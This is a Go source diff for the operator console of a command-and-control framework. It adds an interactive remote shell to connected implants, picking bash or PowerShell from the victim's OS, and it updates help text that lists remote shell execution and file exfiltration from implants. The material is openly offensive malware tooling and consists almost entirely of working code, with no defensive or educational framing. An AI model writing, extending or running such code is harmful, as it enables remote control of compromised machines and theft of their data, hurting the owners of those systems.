@@ -294,6 +294,8 @@ func (op *Operator) Interactive() {
 			if result != nil {
 				displayResult(seqNum, result)
 			}
+		case "ishell":
+			op.interactiveShell(scanner)
 		case "clean":
 			op.cleanAll()
 		case "status":
@@ -302,6 +304,106 @@ func (op *Operator) Interactive() {
 			fmt.Printf("[!] Unknown command: %s. Type 'help'.\n", cmd)
 		}
 	}
+}
+
+// interactiveShell provides a remote shell experience.
+// Detects client OS and shows appropriate prompt ($ or >).
+// Each command is sent, then waits with animated dots until result arrives.
+func (op *Operator) interactiveShell(scanner *bufio.Scanner) {
+	if len(op.connectedClients) == 0 {
+		fmt.Println("[!] No implants connected. Wait for a check-in first.")
+		return
+	}
+
+	// Pick the first connected client
+	var clientID string
+	var info ClientInfo
+	for clientID, info = range op.connectedClients {
+		break
+	}
+
+	// Determine shell type from OS
+	isWindows := strings.Contains(strings.ToLower(info.OS), "windows")
+	promptChar := "$"
+	shellType := "bash"
+	if isWindows {
+		promptChar = ">"
+		shellType = "powershell"
+	}
+
+	fmt.Printf("\n[*] Interactive shell to %s (%s)\n", info.Hostname, info.OS)
+	fmt.Printf("[*] Shell type: %s | Type 'quit' to return to c2>\n\n", shellType)
+
+	_ = clientID // used for display
+
+	for {
+		fmt.Printf("%s@%s %s ", clientID[:8], info.Hostname, promptChar)
+		if !scanner.Scan() {
+			break
+		}
+
+		line := strings.TrimSpace(scanner.Text())
+		if line == "" {
+			continue
+		}
+		if line == "quit" || line == "exit" {
+			fmt.Println("[*] Leaving interactive shell")
+			return
+		}
+
+		// Send the command
+		seq, err := op.SendCommand("shell", map[string]interface{}{"cmd": line})
+		if err != nil {
+			fmt.Printf("[!] Failed to send: %v\n", err)
+			continue
+		}
+
+		// Wait with animated dots
+		op.waitWithAnimation(seq)
+	}
+}
+
+// waitWithAnimation polls for a result while showing animated dots.
+func (op *Operator) waitWithAnimation(seq int) {
+	fmt.Print("  ")
+
+	dotCount := 0
+	timeout := 120 * time.Second
+	pollInterval := 5 * time.Second
+	start := time.Now()
+
+	for time.Since(start) < timeout {
+		// Poll for result
+		results, err := op.PollResults()
+		if err == nil {
+			if result, ok := results[seq]; ok {
+				// Clear the dots line
+				fmt.Print("\r\033[K")
+
+				// Display output
+				data, _ := result["data"].(string)
+				status, _ := result["status"].(string)
+				if status == "error" {
+					fmt.Printf("\033[31m%s\033[0m\n", data)
+				} else {
+					fmt.Print(data)
+					if len(data) > 0 && data[len(data)-1] != '\n' {
+						fmt.Println()
+					}
+				}
+				return
+			}
+		}
+
+		// Animate dots
+		dotCount++
+		dots := strings.Repeat(".", (dotCount%3)+1)
+		fmt.Printf("\r  waiting%s   ", dots)
+		time.Sleep(pollInterval)
+	}
+
+	fmt.Print("\r\033[K")
+	fmt.Printf("[!] Timeout waiting for seq=%d\n", seq)
 }
 
 func (op *Operator) cleanAll() {
@@ -409,13 +511,14 @@ func displayResult(seq int, result map[string]interface{}) {
 func printHelp() {
 	fmt.Println(`
 Available commands:
-  shell <cmd>     Execute a shell command on the implant
+  ishell          Interactive remote shell (auto-detects bash/powershell)
+  shell <cmd>     Execute a single shell command on the implant
   exfil <path>    Exfiltrate a file from the implant
   sysinfo         Gather system info from the implant
   results         Poll for pending results (single pass)
   wait <seq>      Wait for a specific result (blocking)
   clean           Remove all C2 playlists
-  status          Show pending commands
+  status          Show connected implants and pending commands
   help            Show this help
   quit / exit     Exit the console`)
 }
